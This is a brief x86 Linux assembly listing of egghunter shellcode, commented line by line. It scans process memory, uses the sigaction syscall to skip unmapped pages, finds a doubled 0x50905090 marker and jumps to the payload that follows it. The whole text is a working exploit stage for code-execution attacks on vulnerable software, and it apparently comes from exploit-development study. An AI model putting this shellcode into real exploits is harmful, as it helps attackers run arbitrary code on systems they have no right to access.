align_page:
	or cx,0xfff            ; page alignment
next_address:
	inc ecx
	push byte +0x43        ; sigaction(2)
	pop eax                ; store syscall identifier in eax
	int 0x80               ; call sigaction(2)
	cmp al,0xf2            ; did we get an EFAULT?
	jz align_page          ; invalid pointer - try with the next page
	mov eax, 0x50905090    ; place the egg in eax
	mov edi, ecx           ; address to be validated
	scasd                  ; compare eax / edi and increment edi by 4 bytes
	jnz next_address       ; no match - try with the next address
	scasd                  ; first 4 bytes matched, what about the other half?
	jnz next_address       ; no match - try with the next address
	jmp edi                ; egg found! jump to our payload
	